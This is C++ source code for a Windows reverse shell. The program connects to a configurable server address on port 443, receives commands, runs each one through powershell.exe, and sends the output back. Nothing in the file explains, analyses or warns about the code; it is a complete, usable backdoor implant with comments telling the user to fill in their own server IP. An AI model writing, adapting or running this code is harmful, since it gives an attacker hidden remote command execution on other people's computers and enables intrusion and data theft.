#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib

#define SERVER_IP "127.0.0.1"    // Replace with your server's IP address
#define SERVER_PORT 443          // Replace with your server's port number
#define BUFFER_SIZE 4096         // Adjust buffer size as needed
#define TIMEOUT_SECONDS 5        // Adjust timeout value as needed

int main() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed with error: " << result << '\n';
        return 1;
    }

    // Create a socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "socket failed with error: " << WSAGetLastError() << '\n';
        WSACleanup();
        return 1;
    }

    // Set up the server address
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &(serverAddress.sin_addr));

    // Connect to the server
    result = connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress));
    if (result == SOCKET_ERROR) {
        std::cerr << "connect failed with error: " << WSAGetLastError() << '\n';
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to the server at IP " << SERVER_IP << " and port " << SERVER_PORT << ".\n";

    std::cout << "Waiting for command from the server...\n";

    std::thread reader([&]() {
        CHAR buffer[BUFFER_SIZE];
        while (true) {
            // Check if there is data available for reading
            u_long available = 0;
            if (ioctlsocket(clientSocket, FIONREAD, &available) != 0) {
                break;
            }
            if (available == 0) {
                continue;
            }

            // Read command from the server
            int recvResult = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (recvResult <= 0) {
                break;
            }

            // Execute the command and redirect output to the server
            std::string command(buffer, recvResult);

            // Execute the command using system
            std::string fullCommand = "powershell.exe -Command \"" + command + "\"";
            FILE* pipe = _popen(fullCommand.c_str(), "r");
            if (pipe) {
                // Read output from the command and send it back to the server
                std::string response;
                while (fgets(buffer, sizeof(buffer), pipe)) {
                    response += buffer;
                }
                _pclose(pipe);

                // Send the complete response back to the server
                send(clientSocket, response.c_str(), response.size(), 0);
            }

            // Wait for the specified timeout period to receive any further commands
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(clientSocket, &readSet);
            struct timeval timeout;
            timeout.tv_sec = TIMEOUT_SECONDS;
            timeout.tv_usec = 0;
            select(0, &readSet, NULL, NULL, &timeout);
        }
        });

    reader.join();

    // Cleanup
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
